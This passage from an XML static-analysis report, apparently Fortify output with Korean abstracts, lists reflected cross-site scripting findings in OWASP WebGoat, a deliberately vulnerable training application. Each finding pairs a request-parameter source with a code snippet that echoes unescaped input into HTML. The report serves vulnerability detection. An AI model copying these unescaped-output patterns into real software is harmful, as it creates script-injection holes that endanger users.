                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewDatabase.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/ViewDatabase.java</FilePath>
<LineStart>72</LineStart>
<Snippet>	    StringBuffer sqlStatement = new StringBuffer(s.getParser()
		    .getRawParameter(SQL, ""));
	    Input input = new Input(Input.TEXT, SQL, sqlStatement.toString());
	    ec.addElement(input);
</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="23122437F6597AF62CE2DBADC2AFABFB" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BEDCCF5FAF96831DFB46C298DEA5D5F1" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Encoding.java의 makeRow() 메서드가 793 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>793</LineStart>
<Snippet>
		TD desc = new TD().addElement( description ).setBgColor( "#bbbbbb" );
		TD val1 = new TD().addElement( value1 ).setBgColor( "#dddddd" );
		TD val2 = new TD().addElement( value2 ).setBgColor( "#dddddd" );
		TR tr = new TR();</Snippet>
<TargetFunction>org.apache.ecs.html.TD.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="798F0AD96DF9B36A1669B2C7FA3EFDE3" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 91 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>91</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7B73986D3699C6DD9337F53738BA1405" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2211FFA14B1730AA41B4EC02A89A9759" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 163 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>163</LineStart>
<Snippet>			    {
			    	%&gt;
			    	&lt;div id="reset" class="info"&gt;&lt;a href="&lt;%=webSession.getRestartLink()%&gt;"&gt;Restart this Lesson&lt;/a&gt;&lt;/div&gt;
	    			&lt;%
	    			}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F7542E2F12F3A7373CDE5862E7C814B4" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 46 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>46</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9A75C2F16C64D536498D5DE279270851" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>HttpSplitting.java의 createAttackEnvironment() 메서드가 180 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>HttpSplitting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HttpSplitting.java</FilePath>
<LineStart>180</LineStart>
<Snippet>
	//add the search by field
	Input input = new Input(Input.TEXT, LANGUAGE, lang.toString());
	ec.addElement(input);
</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="AC6DDA29DB8C1106366BEDFBE1B2E1E4" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B16160ECAEA44FAED2C77B0DFFD0BFB8" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 71 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>71</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getCcn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4FFDE8A75DB4B7CC47C7FA4B50C68118" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPersonalDescription()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="56F91135D0561F50D05F151536F819F8" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 makeRequestDump_DELETEME() 메서드가 920 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>920</LineStart>
<Snippet>
	t.addElement(new TR().addElement(new TD().setVAlign("TOP").addElement(
		ec)));

	return (t);</Snippet>
<TargetFunction>org.apache.ecs.html.TD.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>900</LineStart>
<Snippet>	try
	{
	    el = new StringElement(readFromFile(s.getRequest().getReader(),
		    false));
	}</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getReader()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="011CBF50B0452709FF1FE1CC8FA779EA" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>JavaScriptValidation.java의 createContent() 메서드가 156 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>JavaScriptValidation.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/JavaScriptValidation.java</FilePath>
<LineStart>156</LineStart>
<Snippet>	    TextArea input4 = new TextArea("field4", 1, 25).addElement(param4);
	    TextArea input5 = new TextArea("field5", 1, 25).addElement(param5);
	    TextArea input6 = new TextArea("field6", 1, 25).addElement(param6);
	    TextArea input7 = new TextArea("field7", 1, 25).addElement(param7);
</Snippet>
<TargetFunction>org.apache.ecs.html.TextArea.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C046881D542A21FF19AC01A47F85AEB3" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 214 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>214</LineStart>
<Snippet>			{
			%&gt;
			&lt;div id="lessonContent"&gt;&lt;%=currentLesson.getContent()%&gt;&lt;/div&gt;
			&lt;%
			}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3E1DFE39AC6795E887C355DBA577DA93" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>JavaScriptValidation.java의 createContent() 메서드가 157 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>JavaScriptValidation.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/JavaScriptValidation.java</FilePath>
<LineStart>157</LineStart>
<Snippet>	    TextArea input5 = new TextArea("field5", 1, 25).addElement(param5);
	    TextArea input6 = new TextArea("field6", 1, 25).addElement(param6);
	    TextArea input7 = new TextArea("field7", 1, 25).addElement(param7);

	    Input b = new Input();</Snippet>
<TargetFunction>org.apache.ecs.html.TextArea.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E350095CB012D2ECF7AC8B80E4032750" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>BasicAuthentication.java의 doStage1() 메서드가 145 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>BasicAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BasicAuthentication.java</FilePath>
<LineStart>145</LineStart>
<Snippet>		    headerName.toString())));
	    row2.addElement(new TD(new Input(Input.TEXT, HEADER_VALUE,
		    headerValue.toString())));

	    t.addElement(row1);</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1F2812DFC26323B71B4329E128DA75E4" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>AbstractLesson.java의 handleRequest() 메서드가 1086 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>1086</LineStart>
<Snippet>		.setEncType("");

	form.addElement(createContent(s));

	setContent(form);</Snippet>
<TargetFunction>org.apache.ecs.html.Form.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="19446190ED48006EA5FC0AC7391FB73C" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>JavaScriptValidation.java의 createContent() 메서드가 152 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>JavaScriptValidation.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/JavaScriptValidation.java</FilePath>
<LineStart>152</LineStart>
<Snippet>	    ec.addElement(new StringElement(script));
	    TextArea input1 = new TextArea("field1", 1, 25).addElement(param1);
	    TextArea input2 = new TextArea("field2", 1, 25).addElement(param2);
	    TextArea input3 = new TextArea("field3", 1, 25).addElement(param3);
	    TextArea input4 = new TextArea("field4", 1, 25).addElement(param4);</Snippet>
<TargetFunction>org.apache.ecs.html.TextArea.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CD76BB6FE804253512FA7C8AF184AF2C" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 66 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CDC14D16B2CD1B1BA14427B6ECE70C10" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Encoding.java의 makeRow() 메서드가 794 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>794</LineStart>
<Snippet>		TD desc = new TD().addElement( description ).setBgColor( "#bbbbbb" );
		TD val1 = new TD().addElement( value1 ).setBgColor( "#dddddd" );
		TD val2 = new TD().addElement( value2 ).setBgColor( "#dddddd" );
		TR tr = new TR();
</Snippet>
<TargetFunction>org.apache.ecs.html.TD.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="737A32658038060D09F9D4E83CEDD366" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ReflectedXSS.java의 createContent() 메서드가 200 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ReflectedXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ReflectedXSS.java</FilePath>
<LineStart>200</LineStart>
<Snippet>			    .addElement("Enter your credit card number:"));
	    tr.addElement(new TD().addElement(new Input(Input.TEXT, "field2",
		    param2)));
	    t.addElement(tr);
	    tr = new TR();</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="36A8490B71BB7E798D64055E71D8A728" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4984894D9F2AB9C6AC930DC0CCE45FFF" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
